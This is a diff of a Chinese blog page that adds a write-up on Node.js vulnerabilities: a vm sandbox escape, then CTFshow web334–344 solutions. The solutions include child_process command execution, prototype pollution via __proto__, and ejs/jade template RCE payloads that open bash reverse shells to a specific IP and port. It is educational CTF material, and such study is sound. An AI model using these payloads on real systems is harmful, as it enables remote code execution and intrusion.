+<p>也就是说我们将code这段要编译和运行的代码限制在了context域中，无法访问到超出上下文外的任何信息</p>
+<p>这看起来是十分安全的方式</p>
+<p>但在官网中有这样一段话<strong>vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。</strong></p>
+<p>也就是说，vm模块同样有被逃逸的风险</p>
+<h2 id="VM逃逸"><a href="#VM逃逸" class="headerlink" title="VM逃逸"></a>VM逃逸</h2><pre class="language-none"><code class="language-none">const vm &#x3D; require(&quot;vm&quot;);
+
+const ctx &#x3D; &#123;&#125;;
+
+vm.runInNewContext(&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;,ctx);
+console.log(&quot;Never gets executed.&quot;);</code></pre>
+
+<p>这段代码就是利用了原型链进行vm逃逸导致了程序的提前退出</p>
+<p>创建vm环境时，首先要初始化一个对象 ctx，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。然后利用constructor来得到Function</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221230610013.png" alt="image-20220221230610013"></p>
+<p>函数构造器就像javascript给出的最高函数，它可以访问全局范围，因此它可以返回任何全局的东西。 函数构造器允许你从一个字符串中生成一个函数，从而执行任意代码。</p>
+<p>上述代码在执行时，this 指向 ctx 并通过原型链的方式拿到沙盒外的 Funtion，vm 虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。</p>
+<p>所以我们能够用process变量来做更多的东西</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221232104068.png" alt="image-20220221232104068"></p>
+<p>或者这样</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222145853148.png" alt="image-20220222145853148"></p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/122166825">ctfshow—Node.js漏洞总结_cosmoslin的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.javashuo.com/article/p-vwozjvrz-nu.html">node.js 沙盒逃逸分析 - JavaShuo</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ophxc/p/13663121.html">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-10">Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)</a></p>
+<h1 id="CTFSHOW-nodejs部分"><a href="#CTFSHOW-nodejs部分" class="headerlink" title="CTFSHOW nodejs部分"></a>CTFSHOW nodejs部分</h1><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154508492.png" alt="image-20220222154508492"></p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154516338.png" alt="image-20220222154516338"></p>
+<p>用户名不为CTFSHOW,还要经过大写转换后等于CTFSHOW,所以传入ctfshow密码为123456就行</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154618537.png" alt="image-20220222154618537"></p>
+<h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>js的命令执行</p>
+<p>可以使用chile_process.exec来间接调用/bash.sh。<br>它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。</p>
+<p>exec因为返回值的问题没法利用</p>
+<p>所以这里可以用execSync</p>
+<p>eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;)</p>
+<p>eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;)</p>
+<p>或者spawnSync</p>
+<p>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</p>
+<p>eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</p>
+<p>还可以用global.process.mainModule.constructor._load替代require</p>
+<p>eval=global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;)</p>
+<h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>过滤了exec</p>
+<p>但是可以用spawnSync</p>
+<p>还可以利用fs模块文件操作</p>
+<pre class="language-none"><code class="language-none">eval&#x3D;require(&#39;fs&#39;).readdirSync(&#39;.&#39;);
+eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;);</code></pre>
+
+<h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>数组绕过，但是不同于php的数组绕过</p>
+<pre class="language-none"><code class="language-none">var express &#x3D; require(&#39;express&#39;);
+var router &#x3D; express.Router();
+var crypto &#x3D; require(&#39;crypto&#39;);
+
+function md5(s) &#123;
+  return crypto.createHash(&#39;md5&#39;)
+    .update(s)
+    .digest(&#39;hex&#39;);
+&#125;
+
+&#x2F;* GET home page. *&#x2F;
+router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var flag&#x3D;&#39;xxxxxxx&#39;;
+  var a &#x3D; req.query.a;
+  var b &#x3D; req.query.b;
+  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;
+  	res.end(flag);
+  &#125;else&#123;
+  	res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);
+  &#125;
+  
+&#125;);
+
+module.exports &#x3D; router;</code></pre>
+
+<p>传入a和b两个参数，长度相同但并不相等，同时拼接上flag的md5值相同</p>
+<p>js有个很奇怪的特性</p>
+<p>不能直接比较两个数组</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163045534.png" alt="image-20220222163045534"></p>
+<p>而且拼接字符串时也有个特性</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163227744.png" alt="image-20220222163227744"></p>
+<p>也就是说我们传入a[]=1&amp;b[]=1就能完美满足if判断得到flag</p>
+<p>而如果我们传入的是非数字索引，那么他就会变成js中的对象</p>
+<p>对象的拼接又有这种特性</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163556092.png" alt="image-20220222163556092"></p>
+<p>所以我们传入a[x]=1&amp;b[x]=2同样可以满足if判断拿到flag</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163644062.png" alt="image-20220222163644062"></p>
+<h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>common.js里有copy函数</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222164222078.png" alt="image-20220222164222078"></p>
+<p>猜测是原型链污染</p>
+<p>看login.js</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222164251260.png" alt="image-20220222164251260"></p>
+<p>让secert的ctfshow属性等于36dboy</p>
+<p>{&quot;<em>_proto</em>_&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}}</p>
+<p>抓包之后改一下</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222171254531.png" alt="image-20220222171254531"></p>
+<h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p><strong>非预期解：</strong>利用ejs模板rce漏洞</p>
+<p>羽师傅的payload：</p>
+<pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;</code></pre>
+
+<p>反弹之前可以先关一下服务器的防火墙systemctl stop firewalld</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225454461.png" alt="image-20220222225454461"></p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225546970.png" alt="image-20220222225546970"></p>
+<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gental_z/article/details/107937110">CVE-2020-7699漏洞分析_gental_z的博客-CSDN博客</a></p>
+<p><strong>预期解：</strong></p>
+<p>登录部分</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222170708843.png" alt="image-20220222170708843"></p>
+<p>同样的copy函数</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222170726147.png" alt="image-20220222170726147"></p>
+<p>这里要求ctfshow=flag的内容，可我们并不知道flag</p>
+<p>我们再看看api.js</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222171015673.png" alt="image-20220222171015673"></p>
+<p>如果我们可以利用原型链控制query的值，那么就能实现反弹shell的操作</p>
+<p>但是这个是变量不是变量的属性，也能污染吗</p>
+<p>答案是可以的</p>
+<pre class="language-none"><code class="language-none">因为所有变量的最顶层都是object，当前环境没有，它会直接去寻找Object对象的属性当中是否有这个键值对是否存在</code></pre>
+
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222173051138.png" alt="image-20220222173051138"></p>
+<p>所以我们可以构造payload</p>
+<pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre>
+
+<p>然后访问一下api页面触发query</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222203151541.png" alt="image-20220222203151541"></p>
+<h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>登录部分</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210758117.png" alt="image-20220222210758117"></p>
+<p>copy函数：</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210810876.png" alt="image-20220222210810876"></p>
+<p>这道题与web339利用点是相同的，我们同样要利用原型链污染来控制query的值达到反弹shell的目的。但是需要向上污染两级才能到达Object对象</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210739146.png" alt="image-20220222210739146"></p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210925672.png" alt="image-20220222210925672"></p>
+<p>所以我们的payload为</p>
+<pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre>
+
+<p>同样传入之后访问一下api页面就行</p>
+<h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>没有了api.js</p>
+<p>所以只能用web339的那个非预期解，只是要跟web340一样向上污染两级</p>
+<pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;&#125;</code></pre>
+
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225203273.png" alt="image-20220222225203273"></p>
+<h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342-web343"></a>web342-web343</h2><p>同样是模板引擎的rce，不过不是之前的ejs，而是jade</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7075#toc-0">ejs原型污染rce分析 - 先知社区 (aliyun.com)</a></p>
+<p>用一个payload都能打</p>
+<pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre>
+
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220223144941601.png" alt="image-20220223144941601"></p>
+<h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>代码：</p>
+<pre class="language-none"><code class="language-none">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var flag &#x3D; &#39;flag_here&#39;;
+  if(req.url.match(&#x2F;8c|2c|\,&#x2F;ig))&#123;
+  	res.end(&#39;where is flag :)&#39;);
+  &#125;
+  var query &#x3D; JSON.parse(req.query.query);
+  if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123;
+  	res.end(flag);
+  &#125;else&#123;
+  	res.end(&#39;where is flag. :)&#39;);
+  &#125;
+
+&#125;);</code></pre>
+
+<p>如果没有过滤，那么我们直接传入</p>
+<pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code></pre>
+
+<p>就行，但是题目把逗号和他的url编码过滤了</p>
+<p>这时就要尝试用&amp;绕过</p>
+<pre class="language-none"><code class="language-none">nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析</code></pre>
+
+<p>所以最终payload为</p>
+<pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125; </code></pre>
+
+<p>把c也编码的原因是防止和双引号的url编码构成%22c</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220223150552411.png" alt="image-20220223150552411"></p>
+
                 
             </div>
             <hr/>
@@ -554,7 +835,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2021/08/31/%E6%80%BB%E7%BB%93/">https://Ethe448.github.io/2021/08/31/%E6%80%BB%E7%BB%93/</a>
+                    <a href="https://Ethe448.github.io/2022/02/21/js%E6%BC%8F%E6%B4%9E/">https://Ethe448.github.io/2022/02/21/js%E6%BC%8F%E6%B4%9E/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -592,8 +873,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                                    <span class="chip bg-color">随笔</span>
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
                                 </a>
                             
                         </div>
@@ -1037,24 +1318,24 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/10/02/github%E4%BD%BF%E7%94%A8/">
+                <a href="/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="github使用">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="从一道ctf题看php原生类">
                         
-                        <span class="card-title">github使用</span>
+                        <span class="card-title">从一道ctf题看php原生类</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ​    在学python的时候顺便学了些GitHub的使用，写个文档防止忘了
+                            
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-02
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-25
                         </span>
                         <span class="publish-author">
                             
@@ -1067,8 +1348,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                        <span class="chip bg-color">随笔</span>
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                 </div>
@@ -1082,25 +1363,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                <a href="/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="反序列化">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="VNCTF复现">
                         
-                        <span class="card-title">反序列化</span>
+                        <span class="card-title">VNCTF复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数
-serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法
+                            Here's something encrypted, password is required to continue reading.
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-13
                             </span>
                         <span class="publish-author">
                             
@@ -1113,12 +1393,8 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">web学习</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                        <span class="chip bg-color">反序列化</span>
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
                     </a>
                     
                 </div>
